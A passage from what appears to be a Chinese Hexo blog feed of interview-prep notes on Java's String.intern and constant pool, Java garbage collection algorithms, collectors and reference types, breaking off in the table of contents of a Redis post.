String(<span class="string">"Hollis"</span>).intern();</span><br><span class="line"> </span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br></pre></td></tr></table></figure><p>你可以简单的理解为<code>String s1 = &quot;Hollis&quot;;</code>和<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>做的事情是一样的（但实际有些区别，这里暂不展开）。都是定义一个字符串对象，然后将其字符串字面量保存在常量池中，并把这个字面量的引用返回给定义好的对象引用。如下图：</p><p>对于<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>，在不调intern情况，s3 指向的是 JVM 在堆中创建的那个对象的引用的（如图中的s2）。但是当执行了 intern 方法时，s3 将指向字符串常量池中的那个字符串常量。</p><p>由于 s1 和 s3 都是字符串常量池中的字面量的引用，所以 s1==s3。但是，s2 的引用是堆中的对象，所以 s2!=s1。</p><h2><span id="intern-的正确用法">intern 的正确用法</span></h2><p>不知道，你有没有发现，在<code>String s3 = new String(&quot;Hollis&quot;).intern();</code>中，其实 intern 是多余的？</p><p>因为就算不用 intern，Hollis 作为一个字面量也会被加载到 Class 文件的常量池，进而加入到运行时常量池中，为啥还要多此一举呢？到底什么场景下才会用到 intern 呢?<br> 在解释这个之前，我们先来看下以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="string">"Hollis"</span>;</span><br><span class="line">String s2 = <span class="string">"Chuang"</span>;</span><br><span class="line">String s3 = s1 + s2;</span><br><span class="line">String s4 = <span class="string">"Hollis"</span> + <span class="string">"Chuang"</span>;</span><br></pre></td></tr></table></figure><p>在经过反编译后，得到代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="string">"Hollis"</span>;</span><br><span class="line">String s2 = <span class="string">"Chuang"</span>;</span><br><span class="line">String s3 = (<span class="keyword">new</span> StringBuilder()).append(s1).append(s2).toString();</span><br><span class="line">String s4 = <span class="string">"HollisChuang"</span>;</span><br></pre></td></tr></table></figure><p>可以发现，同样是字符串拼接，s3 和s4 在经过编译器编译后的实现方式并不一样。s3 被转化成 StringBuilder 及 append，而 s4 被直接拼接成新的字符串。</p><p>如果你感兴趣，你还能发现，String s4 = s1 + s2; 经过编译之后，常量池中是有两个字符串常量的分别是 Hollis、Chuang（其实 Hollis 和 Chuang 是String s1 = “Hollis”;和String s2 = “Chuang”;定义出来的），<strong>拼接结果HollisChuang 并不在常量池中。</strong></p><p>如果代码只有String s4 = “Hollis” + “Chuang”;，那么常量池中将只有 HollisChuang 而没有 Hollis 和 Chuang。</p><p>究其原因，<strong>是因为常量池要保存的是已确定的字面量值。</strong>也就是说，对于字符串的拼接，纯字面量和字面量的拼接，会把拼接结果作为常量保存到字符串。</p><p>如果在字符串拼接中，有一个参数是非字面量，而是一个变量的话，整个拼接操作会被编译成StringBuilder.append，这种情况编译器是无法知道其确定值的。只有在运行期才能确定。</p><p>那么，有了这个特性了，intern 就有用武之地了。那就是很多时候，我们在程序中用到的<strong>字符串是只有在运行期才能确定</strong>的，在编译期是无法确定的，那么也就没办法在编译期被加入到常量池中。</p><p>这时候，对于那种可能经常使用的字符串，使用 intern 进行定义，每次 JVM 运行到这段代码的时候，就会直接把常量池中该字面值的引用返回，这样就可以减少大量字符串对象的创建了。<br> 如一美团点评团队的《深入解析String#intern》文中举的一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAX = <span class="number">1000</span> * <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String[] arr = <span class="keyword">new</span> String[MAX];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Integer[] DB_DATA = <span class="keyword">new</span> Integer[<span class="number">10</span>];</span><br><span class="line">    Random random = <span class="keyword">new</span> Random(<span class="number">10</span> * <span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; DB_DATA.length; i++) &#123;</span><br><span class="line">        DB_DATA[i] = random.nextInt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MAX; i++) &#123;</span><br><span class="line">         arr[i] = <span class="keyword">new</span> String(String.valueOf(DB_DATA[i % DB_DATA.length])).intern();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在以上代码中，我们明确的知道，会有很多重复的相同的字符串产生，但是这些字符串的值都是只有在运行期才能确定的。所以，只能我们通过intern显示的将其加入常量池，<strong>这样可以减少很多字符串的重复创建。</strong></p><h2><span id="总结">总结</span></h2><p>我们再回到文章开头那个疑惑：按照上面的两个面试题的回答，就是说new String也会检查常量池，如果有的话就直接引用，如果不存在就要在常量池创建一个，那么还要intern干啥？难道以下代码是没有意义的吗？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="keyword">new</span> String(<span class="string">"Hollis"</span>).intern();</span><br></pre></td></tr></table></figure><p>new String 所谓的“如果有的话就直接引用”，指的是Java堆中创建的String对象中包含的字符串字面量直接引用字符串池中的字面量对象。也就是说，还是要在堆里面创建对象的。</p><p>而<code>intern``中说的``“``如果有的话就直接返回其引用``”``，指的是会把字面量对象的引用直接返回给定义的对象。这个过程是不会在`` Java ``堆中再创建一个`` String ``对象的。</code></p><p>的确，以上代码的写法其实是使用 intern 是没什么意义的。因为字面量 Hollis 会作为编译期常量被加载到运行时常量池。</p><p>之所以能有以上的疑惑，其实是对字符串常量池、字面量等概念没有真正理解导致的。有些问题其实就是这样，单个问题，自己都知道答案，但是多个问题综合到一起就蒙了。归根结底是知识的理解还停留在点上，没有串成面。</p><p><a href="https://blog.csdn.net/ShelleyLittlehero/article/details/81196418" target="_blank" rel="noopener">https://blog.csdn.net/ShelleyLittlehero/article/details/81196418</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java GC</title>
      <link href="/2020/03/28/Java-GC/"/>
      <url>/2020/03/28/Java-GC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的Java GC</p><a id="more"></a><!-- toc --><ul><li><a href="#自动化解决了">自动化解决了：√</a></li><li><a href="#对象被判定为垃圾的标准">对象被判定为垃圾的标准： √</a></li><li><a href="#判定方法">判定方法</a><ul><li><a href="#引用计数法">引用计数法 √</a></li><li><a href="#可达性分析算法主流">可达性分析算法（主流）√</a><ul><li><a href="#可以作为gc-root的对象-">可以作为GC Root的对象 -</a></li></ul></li></ul></li><li><a href="#垃圾回收算法">垃圾回收算法</a><ul><li><a href="#标记-清除算法mark-and-sweep-">标记-清除算法（Mark and Sweep）-</a><ul><li><a href="#缺点">缺点：</a></li></ul></li><li><a href="#复制算法copying-">复制算法（Copying）-</a><ul><li><a href="#优点">优点：</a></li><li><a href="#缺点-1">缺点：</a></li></ul></li><li><a href="#标记-整理算法compacting比较适用于老年代的垃圾回收-">标记-整理算法（Compacting）比较适用于老年代的垃圾回收 -</a><ul><li><a href="#特点">特点</a></li></ul></li><li><a href="#分代收集算法generational-collector">分代收集算法（Generational Collector）√</a><ul><li><a href="#gc的分类">GC的分类</a><ul><li><a href="#minor-gc">Minor GC √</a></li><li><a href="#full-gc">Full GC √</a></li></ul></li><li><a href="#年轻代尽可能快速地收集掉那些生命周期短的对象">年轻代：尽可能快速地收集掉那些生命周期短的对象 √</a></li><li><a href="#对象如何晋升到老年代">对象如何晋升到老年代 √</a></li><li><a href="#常用的调优参数">常用的调优参数</a></li><li><a href="#触发full-gc的条件3点即可">触发Full GC的条件（3点即可） √</a></li><li><a href="#触发minor-gc的条件-">触发Minor GC的条件 -</a></li><li><a href="#stop-the-world">Stop-the-World √</a></li><li><a href="#safepoint-">Safepoint -</a></li></ul></li></ul></li><li><a href="#常见的垃圾收集器">常见的垃圾收集器</a><ul><li><a href="#jvm的运行模式">JVM的运行模式：√</a></li><li><a href="#垃圾收集器之间的联系">垃圾收集器之间的联系</a></li><li><a href="#年轻代常见垃圾收集器">年轻代常见垃圾收集器</a><ul><li><a href="#serial收集器">Serial收集器 √</a></li><li><a href="#parnew收集器">ParNew收集器 √</a></li><li><a href="#parallel-scavenge收集器">Parallel Scavenge收集器 √</a></li></ul></li><li><a href="#老年代常见垃圾收集器">老年代常见垃圾收集器</a><ul><li><a href="#serial-old收集器">Serial Old收集器 √</a></li><li><a href="#parallel-old收集器-">Parallel Old收集器 -</a></li><li><a href="#cms收集器-">CMS收集器 -</a></li></ul></li><li><a href="#g1收集器-">G1收集器 -</a><ul><li><a href="#garbage-first收集器的特点">Garbage First收集器的特点</a></li></ul><ul><li><a href="#object的finalize方法是否与c的析构函数作用相同-">Object的finalize（）方法是否与C++的析构函数作用相同 -</a></li><li><a href="#java中的强引用软引用弱引用虚引用有什么用">Java中的强引用，软引用，弱引用，虚引用有什么用</a></li></ul></li><li><a href="#强引用strong-reference">强引用（Strong Reference）√</a></li><li><a href="#软引用soft-reference">软引用（Soft Reference）√</a></li><li><a href="#弱引用weak-reference">弱引用（Weak Reference）√</a></li><li><a href="#虚引用phantomreference-">虚引用（PhantomReference）-</a><ul><li><a href="#引用队列referencequeue-">引用队列ReferenceQueue -</a></li></ul></li></ul></li></ul><!-- tocstop --><p><img src="image-20200328164459719.png" alt="知识图谱"></p><h2><span id="自动化解决了">自动化解决了：√</span></h2><p>第一个对象内存分配的问题。</p><p>第二个回收分配给对象的内存的问题</p><p><strong>活动于Java 堆</strong></p><h2><span id="对象被判定为垃圾的标准">对象被判定为垃圾的标准： √</span></h2><p>没有被其他对象引用</p><h2><span id="判定方法">判定方法</span></h2><h3><span id="引用计数法">引用计数法 √</span></h3><p>Ø 通过判断对象的引用数量来决定对象是否可以被回收</p><p>Ø 每个对象实例都有一个引用计数器，被引用则+1，完成引用则-1</p><p>Ø 任何引用计数为0的对象实例都可以被当作垃圾收集</p><p>Ø <strong>优点</strong>：执行效率高，程序执行受影响较小</p><p>Ø <strong>缺点</strong>：无法检测出循环引用的情况，导致内存泄漏</p><p>实例：</p><p><img src="clip_image001.png" alt="循环引用"></p><p><img src="clip_image002.png" alt="循环引用"></p><h3><span id="可达性分析算法主流">可达性分析算法（主流）√</span></h3><p>通过判断对象的引用链是否可达来决定对象是否可以被回收</p><p><img src="clip_image003.png" alt="GCroot"></p><h4><span id="可以作为gc-root的对象-">可以作为GC Root的对象 -</span></h4><p>Ø 虚拟机栈中引用的对象（栈帧中的本地变量表）</p><p>Ø 方法区中的常量引用的对象</p><p>Ø 方法区中的类静态属性引用的对象</p><p>Ø 本地方法栈中JNI（Native方法）的引用对象</p><p>Ø 活跃线程的引用对象</p><h2><span id="垃圾回收算法">垃圾回收算法</span></h2><h3><span id="标记-清除算法mark-and-sweep-">标记-清除算法（Mark and Sweep）-</span></h3><p>Ø 标记：<font color="red">从根集合进行扫描</font>，对存活的对象进行标记</p><p>Ø 清除：对堆内存从头到尾进行线性遍历，回收不可达对象内存</p><p><img src="clip_image001-1585385927983.png" alt></p><h4><span id="缺点">缺点：</span></h4><p>Ø <strong>碎片化</strong></p><p>由于标记清除不需要进行对象的移动并且仅对不存活的对象进行处理，因此标记清除后会产生大量不连续的内存碎片，空间碎片太多可能会导致以后在程序运行中需要分配较大的对象时无法找到足够的连续内存而不得不提前触发另一次垃圾回收工作。</p><h3><span id="复制算法copying-">复制算法（Copying）-</span></h3><p>Ø 分为对象面和空闲面</p><p>Ø 对象在对象面创建</p><p>Ø 存活的对象被从对象面复制到空闲面</p><p>Ø 将对象面所有对象内存清除 </p><h4><span id="优点">优点：</span></h4><p>Ø 解决碎片化问题</p><p>Ø 顺序分配内存，简单高效</p><p>Ø 适用于对象存活率低的场景 </p><p><img src="clip_image003.jpg" alt></p><h4><span id="缺点">缺点：</span></h4><p>复制收集算法在应对对象存活率较高的情况时，要进行较多的复制操作，效率将会变低。如果不想浪费百分之50的空间，就要有额外空间分配担保以应对被使用的内存中所有对象都存活的极端情况。（在老年代不能直接使用这种算法） </p><h3><span id="标记-整理算法compacting比较适用于老年代的垃圾回收-">标记-整理算法（Compacting）比较适用于老年代的垃圾回收 -</span></h3><p>Ø 标记：从根集合进行扫描，对存活的对象进行标记</p><p>Ø 清除：移动所有存活的对象，且按照内存地址次序依次排列，然后将末端内存地址以后的内存全部回收。 </p><h4><span id="特点">特点</span></h4><p>Ø 避免内存的不连续行</p><p>Ø 不用设置两块内存交换</p><p>Ø 适用于存活率高的场景 </p><p><img src="clip_image005.jpg" alt></p><h3><span id="分代收集算法generational-collector">分代收集算法（Generational Collector）√</span></h3><p>Ø 垃圾回收算法的组合拳</p><p>Ø 按照对象生命周期的不同划分区域以采用不同的垃圾回收算法</p><p>Ø 目的：提高JVM的回收效率</p><p><img src="image-20200328171210066.png" alt></p><p><img src="image-20200328171218664.png" alt></p><h4><span id="gc的分类">GC的分类</span></h4><h5><span id="minor-gc">Minor GC √</span></h5><p>发生在年轻代中的垃圾收集工作，所采用的是<strong>复制算法</strong>，年轻代几乎是所有java对象出生的地方（即java内存的申请和存放都是在这个地方），java中的大部分对象通常不需要长久的存活，因此新生代是GC收集垃圾的频繁区域。</p><h5><span id="full-gc">Full GC √</span></h5><p>由于老年代的垃圾的回收一般会伴随着年轻代的垃圾收集，因此称为Full GC</p><h4><span id="年轻代尽可能快速地收集掉那些生命周期短的对象">年轻代：尽可能快速地收集掉那些生命周期短的对象 √</span></h4><p>Ø Eden区（新的对象首先放入Eden区，如果放不下可能放到survivor甚至是老年代中）</p><p>Ø 两个Survivor区（分为From区和To区）</p><p><img src="image-20200328171413003.png" alt></p><p><img src="image-20200328171420212.png" alt></p><p><img src="image-20200328171426946.png" alt></p><p>如果对象在Eden出生，并且被挤满：</p><p>会触发一次Minor GC，如果此时对象存活，就会被复制到一块survivor区中</p><p>我们假设复制到s0中，称s0为from区域，清理所有使用过的Eden区域，并将存活对象的年龄设置成1.</p><p><img src="image-20200328171437728.png" alt></p><p>假设Eden区再次填满</p><p><img src="image-20200328171447785.png" alt></p><p>再次触发Minor GC，然后将Eden中和S0中的存活对象拷贝到s1中并将年龄+1</p><p>此时s1从to区变成了from区，s0从from区变成了to区。拷贝完成后Eden和s0均被清空，这样便完成了第二次Minor GC</p><p><img src="image-20200328171458250.png" alt></p><p>假设此时Eden区又满了，触发了第三次Minor GC。</p><p><img src="image-20200328171510652.png" alt></p><p>当对象年龄达到某个值时这些对象会成为老年代（默认是15岁），也可以用-XX:MaxTenuringThreshold来调整。这也不是一定的，对于一些较大的对象即需分配一块较大的连续空间的对象就会进入到老年代。</p><h4><span id="对象如何晋升到老年代">对象如何晋升到老年代 √</span></h4><p>Ø 经历一定Minor次数依然存活的对象</p><p>Ø Survivor区中存放不下的对象</p><p>Ø 新生成的大对象（-XX：+PretenuerSizeThreshold）</p><h4><span id="常用的调优参数">常用的调优参数</span></h4><p>Ø -XX:SurvivorRatio: Eden和Survivor的比值，默认8:1</p><p>Ø -XX：NewRatio：老年代年轻代内存大小的比例 1:2</p><p>Ø -XX：MaxTenuringThreshold：对象从年轻代晋升到老年代经过GC次数的最大阈值</p><p><strong>使用-Xms和-Xmx来设置老年代和年轻代内存大小</strong></p><p><img src="image-20200328172048512.png" alt></p><p>Full GC和Major GC（单指老年代或者等价于Full GC 看其他人怎么定义）</p><p>Full GC比Minor GC慢得多，但是执行频率低</p><h4><span id="触发full-gc的条件3点即可">触发Full GC的条件（3点即可） √</span></h4><p>Ø 老年代空间不足</p><p>Ø 永久代空间不足</p><p>Ø CMS GC时出现promotion failed, concurrent mode failure</p><p>Ø Minor GC晋升老年代的平均大小大于老年代的剩余空间</p><p>Ø 调用System.gc();</p><p>Ø 使用RMI来进行RPC或管理的JDK应用，每小时执行一次Full GC</p><p>Promotion failed是在进行minor GC的时候Survivor space放不下，对象只能放入老年代，但是此时老年代也放不下。</p><p>Concurrent mode failure是在进行CMS GC的时候同时有对象要放入老年代中，而此时老年代空间不足。</p><h4><span id="触发minor-gc的条件-">触发Minor GC的条件 -</span></h4><p>当eden区满了</p><h4><span id="stop-the-world">Stop-the-World √</span></h4><p>Ø JVM由于要执行GC而停止了应用程序的执行</p><p>Ø 任何一种GC算法中都会发生</p><p>Ø 多数GC优化通过减少Stop-the-world发生的时间来提高程序性能</p><h4><span id="safepoint-">Safepoint -</span></h4><p>安全点就是指，当线程运行到这类位置时，堆对象状态是确定一致的，JVM可以安全地进行操作，如GC，偏向锁解除等。</p><p>Ø 分析过程中对象引用关系不会发生变化的点</p><p>Ø 产生Safepoint的地方：方法调用；循环跳转；异常跳转等</p><p>Ø 安全点数量得适中</p><h2><span id="常见的垃圾收集器">常见的垃圾收集器</span></h2><p>除了CMS都是 年轻代复制， 老年代标记整理</p><h4><span id="jvm的运行模式">JVM的运行模式：√</span></h4><p>Ø Server</p><p>Ø Client </p><p>Server启动慢，稳定后运行块</p><p>Client启动快。</p><p>使用java –version就能看到运行在哪个模式下</p><h4><span id="垃圾收集器之间的联系">垃圾收集器之间的联系</span></h4><p><img src="clip_image001-1585387688405.png" alt></p><p>有连线代表可以结合使用。</p><h4><span id="年轻代常见垃圾收集器">年轻代常见垃圾收集器</span></h4><h5><span id="serial收集器">Serial收集器 √</span></h5><p><img src="image-20200328172855756.png" alt></p><h5><span id="parnew收集器">ParNew收集器 √</span></h5><p><img src="image-20200328172935139.png" alt></p><h5><span id="parallel-scavenge收集器">Parallel Scavenge收集器 √</span></h5><p><img src="clip_image002.jpg" alt></p><p><strong>吞吐量=（运行用户代码时间）/（垃圾收集时间+运行用户代码时间）</strong></p><h4><span id="老年代常见垃圾收集器">老年代常见垃圾收集器</span></h4><h5><span id="serial-old收集器">Serial Old收集器 √</span></h5><p><img src="clip_image002-1585388023328.jpg" alt></p><h5><span id="parallel-old收集器-">Parallel Old收集器 -</span></h5><p><img src="clip_image004.jpg" alt></p><h5><span id="cms收集器-">CMS收集器 -</span></h5><p>资源消耗大，尽可能缩短停顿时间，适用于存活时间长的对象。</p><p><img src="clip_image006.jpg" alt></p><p> <img src="clip_image008.jpg" alt></p><h4><span id="g1收集器-">G1收集器 -</span></h4><p><strong>使用 –XX:+UseG1GC</strong></p><p><strong>使用：复制+标记-整理算法</strong></p><h5><span id="garbage-first收集器的特点">Garbage First收集器的特点</span></h5><p>Ø 并行和并发</p><p>Ø 分代收集</p><p>Ø 空间整合</p><p>Ø 可预测的停顿 </p><p><img src="clip_image010.jpg" alt></p><p>G1收集器的运作大致可划分为以下几个步骤：</p><p>1、初始标记（Initial Making）</p><p>2、并发标记（Concurrent Marking）</p><p>3、最终标记（Final Marking）</p><p>4、筛选回收（Live Data Counting and Evacuation）</p><p>G1和Parallel Scavenge都没用传统的GC框架而是独立实现的。</p><h3><span id="object的finalize方法是否与c的析构函数作用相同-">Object的finalize（）方法是否与C++的析构函数作用相同 -</span></h3><p>Ø 与C++的析构函数不同，析构函数调用确定，而它的是不确定的</p><p>Ø <font color="red">将未被引用的对象放置于F-Queue队列</font></p><p>Ø 方法执行随时可能被终止</p><p>Ø 给予对象最后一次重生的机会</p><p><img src="clip_image002-1585388167455.jpg" alt></p><p>其实是不符合预期的（还没有执行finalization=this的操作）因此加上sleep </p><p><img src="clip_image004-1585388167455.jpg" alt></p><p>为对象创造一次重生的机会。但是不确定性较大，无法保证各对象的调用顺序，同时运行代价相当高昂，不建议使用finalize方法。</p><p>F已经是空指针了，但是f指向的对象还是有finalization指向的。</p><p><img src="clip_image006-1585388167455.jpg" alt></p><h3><span id="java中的强引用软引用弱引用虚引用有什么用">Java中的强引用，软引用，弱引用，虚引用有什么用</span></h3><h4><span id="强引用strong-reference">强引用（Strong Reference）√</span></h4><p>Ø 最普遍的引用：Object obj=new Object()</p><p>Ø 抛出OutOfMemoryError终止程序也不会回收具有强引用的对象</p><p>Ø 通过将对象设置成null来弱化引用，使其被回收</p><h4><span id="软引用soft-reference">软引用（Soft Reference）√</span></h4><p>Ø 对象处在有用但非必须的状态</p><p>Ø 只有当内存空间不足时，GC会回收该引用的对象的内存</p><p>Ø 可以用来实现高速缓存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="keyword">new</span> String(<span class="string">"abc"</span>);<span class="comment">// 强引用</span></span><br><span class="line">SoftReference&lt;String&gt; softReference = <span class="keyword">new</span> SoftReference&lt;&gt;(str);<span class="comment">//软引用</span></span><br></pre></td></tr></table></figure><p>还可以配合引用队列使用</p><h4><span id="弱引用weak-reference">弱引用（Weak Reference）√</span></h4><p>Ø 非必须的对象，比软引用更弱一些</p><p>Ø GC时会被回收</p><p>Ø 被回收的概率也不大，因为GC线程优先级比较低</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="keyword">new</span> String(<span class="string">"abc"</span>);<span class="comment">// 强引用</span></span><br><span class="line">WeakReference&lt;String&gt; weakReference = <span class="keyword">new</span> WeakReference&lt;&gt;(str);<span class="comment">//弱引用</span></span><br></pre></td></tr></table></figure><h4><span id="虚引用phantomreference-">虚引用（PhantomReference）-</span></h4><p>Ø 不会决定对象的生命周期</p><p>Ø 任何时候都可能被垃圾收集器回收</p><p>Ø 跟踪对象被垃圾收集器回收的活动，起哨兵作用</p><p>Ø 必须和引用队列ReferenceQueue联合使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="keyword">new</span> String(<span class="string">"abc"</span>);<span class="comment">// 强引用</span></span><br><span class="line">ReferenceQueue queue = <span class="keyword">new</span> ReferenceQueue();</span><br><span class="line">PhantomReference&lt;String&gt; ref = <span class="keyword">new</span> PhantomReference&lt;&gt;(str,queue);<span class="comment">//弱引用</span></span><br></pre></td></tr></table></figure><p> <img src="clip_image008-1585388167455.jpg" alt></p><p> <img src="clip_image010-1585388167455.jpg" alt></p><h3><span id="引用队列referencequeue-">引用队列ReferenceQueue -</span></h3><p>Ø 无实际存储结构，储存逻辑依赖于内部节点之间的关系来表达</p><p>Ø 存储关联的且被GC的软引用，弱引用和虚引用</p><p>节点是reference本身，queue是类似链表的结构</p><p><img src="clip_image012.jpg" alt></p><p><img src="clip_image014.jpg" alt></p><p><img src="clip_image016.jpg" alt></p><p><img src="clip_image018.jpg" alt></p><p><img src="clip_image020.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis进阶【转】</title>
      <link href="/2020/03/27/redis-advance/"/>
      <url>/2020/03/27/redis-advance/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>盘点了常考的Redis进阶知识点</p><a id="more"></a><!-- toc --><ul><li><a href="#项目中缓存是如何使用的为什么要用缓存缓存使用不当会造成什么后果">项目中缓存是如何使用的？为什么要用缓存？缓存使用不当会造成什么后果？</a><ul><li><a href="#面试官心理分析">面试官心理分析</a></li><li><a href="#面试题剖析">面试题剖析</a><ul><li><a href="#项目中缓存是如何使用的">项目中缓存是如何使用的？</a></li><li><a href="#为什么要用缓存">为什么要用缓存？</a><ul><li><a href="#高性能">高性能</a></li><li><a href="#高并发">高并发</a></li></ul></li><li><a href="#用了缓存之后会有什么不良后果">用了缓存之后会有什么不良后果？</a></li></ul></li></ul></li><li><a href="#redis-都有哪些数据类型分别在哪些场景下使用比较合适">redis 都有哪些数据类型？分别在哪些场景下使用比较合适？</a><ul><li><a href="#面试官心理分析-1">面试官心理分析</a></li><li><a href="#面试题剖析-1">面试题剖析</a><ul><li><a href="#string">string</a></li><li><a href="#hash">hash</a></li><li><a href="#list">list</a></li><li><a href="#set">set</a></li><li><a href="#sorted-set">sorted set</a></li></ul></li></ul></li><li><a href="#redis-的过期策略都有哪些内存淘汰机制都有哪些手写一下-lru-代码实现">redis 的过期策略都有哪些？内存淘汰机制都有哪些？手写一下 LRU 代码实现？</a><ul><li><a href="#面试官心理分析-2">面试官心理分析</a></li><li><a href="#面试题剖析-2">面试题剖析</a><ul><li><a href="#redis-过期策略">redis 过期策略</a></li><li><a href="#内存淘汰机制">内存淘汰机制</a></li><li><a href="#手写一个-lru-算法">手写一个 LRU 算法</a></li></ul></li></ul></li><li><a href="#redis-的持久化有哪几种方式不同的持久化机制都有什么优缺点持久化机制具体底层是如何实现的">redis 的持久化有哪几种方式？不同的持久化机制都有什么优缺点？持久化机制具体底层是如何实现的？</a><ul><li><a href="#面试官心理分析-3">面试官心理分析</a></li><li><a href="#面试题剖析-3">面试题剖析</a><ul><li><a href="#redis-持久化的两种方式">redis 持久化的两种方式</a><ul><li><a href="#rdb-优缺点">RDB 优缺点</a></li><li><a href="#aof-优缺点">AOF 优缺点</a></li></ul></li><li><a href="#rdb-和-aof-到底该如何选择">RDB 和 AOF 到底该如何选择</a></li></ul></li></ul></li><li><a href="#如何保证缓存与数据库的双写一致性">如何保证缓存与数据库的双写一致性？</a><ul><li><a href="#面试官心理分析-4">面试官心理分析</a></li><li><a href="#面试题剖析-4">面试题剖析</a><ul><li><a href="#cache-aside-pattern">Cache Aside Pattern</a></li><li><a href="#最初级的缓存不一致问题及解决方案">最初级的缓存不一致问题及解决方案</a></li><li><a href="#比较复杂的数据不一致问题分析">比较复杂的数据不一致问题分析</a></li></ul></li></ul></li><li><a href="#redis-的并发竞争问题是什么如何解决这个问题了解-redis-事务的-cas-方案吗">redis 的并发竞争问题是什么？如何解决这个问题？了解 redis 事务的 CAS 方案吗？</a><ul><li><a href="#面试官心理分析-5">面试官心理分析</a></li><li><a href="#面试题剖析-5">面试题剖析</a></li></ul></li><li><a href="#了解什么是-redis-的雪崩-穿透和击穿redis-崩溃之后会怎么样系统该如何应对这种情况如何处理-redis-的穿透">了解什么是 redis 的雪崩、穿透和击穿？redis 崩溃之后会怎么样？系统该如何应对这种情况？如何处理 redis 的穿透？</a><ul><li><a href="#面试官心理分析-6">面试官心理分析</a></li><li><a href="#面试题剖析-6">面试题剖析</a><ul><li><a href="#缓存雪崩">缓存雪崩</a></li><li><a href="#缓存穿透">缓存穿透</a></li><li><a href="#缓存击穿">缓存击穿</a></li></ul></li></ul></li><li><a href="#redis-主从架构">Redis 主从架构</a><ul><li><a href="#redis-replication-的核心机制">redis replication 的核心机制</a></li><li><a href="#redis-主从复制的核心原理">redis 主从复制的核心原理</a><ul><li><a href="#主从复制的断点续传">主从复制的断点续传</a></li><li><a href="#无磁盘化复制">无磁盘化复制</a></li><li><a href="#过期-key-处理">过期 key 处理</a></li></ul></li><li><a href="#复制的完整流程">复制的完整流程</a><ul><li><a href="#全量复制">全量复制</a></li><li><a href="#增量复制">增量复制</a></li><li><a href="#heartbeat">heartbeat</a></li><li><a href="#异步复制">异步复制</a></li></ul></li><li><a href="#redis-如何才能做到高可用">redis 如何才能做到高可用</a></li></ul></li><li><a href="#redis-哨兵集群实现高可用">Redis 哨兵集群实现高可用</a><ul><li><a href="#哨兵的介绍">哨兵的介绍</a></li><li><a href="#哨兵的核心知识">哨兵的核心知识</a></li><li><a href="#redis-哨兵主备切换的数据丢失问题">redis 哨兵主备切换的数据丢失问题</a><ul><li><a href="#两种情况和导致数据丢失">两种情况和导致数据丢失</a></li><li><a href="#数据丢失问题的解决方案">数据丢失问题的解决方案</a></li></ul></li><li><a href="#sdown-和-odown-转换机制">sdown 和 odown 转换机制</a></li><li><a href="#哨兵集群的自动发现机制">哨兵集群的自动发现机制</a></li><li><a href="#slave-配置的自动纠正">slave 配置的自动纠正</a></li><li><a href="#slave-master-选举算法">slave-&gt;master 选举算法</a></li><li><a href="#quorum-和-majority">quorum 和 majority</a></li><li><a href="#configuration-epoch">configuration epoch</a></li><li><a href="#configuration-传播">configuration 传播</a></li></ul></li><li><a href="#redis-集群模式的工作原理能说一下么在集群模式下redis-的-key-是如何寻址的分布式寻址都有哪些算法了解一致性-hash-算法吗">redis 集群模式的工作原理能说一下么？在集群模式下，redis 的 key 是如何寻址的？分布式寻址都有哪些算法？了解一致性 hash 算法吗？</a><ul><li><a href="#面试官心理分析-7">面试官心理分析</a></li><li><a href="#面试题剖析-7">面试题剖析</a><ul><li><a href="#redis-cluster-介绍">redis cluster 介绍</a></li><li><a href="#节点间的内部通信机制">节点间的内部通信机制</a><ul><li><a href="#基本通信原理">基本通信原理</a></li><li><a 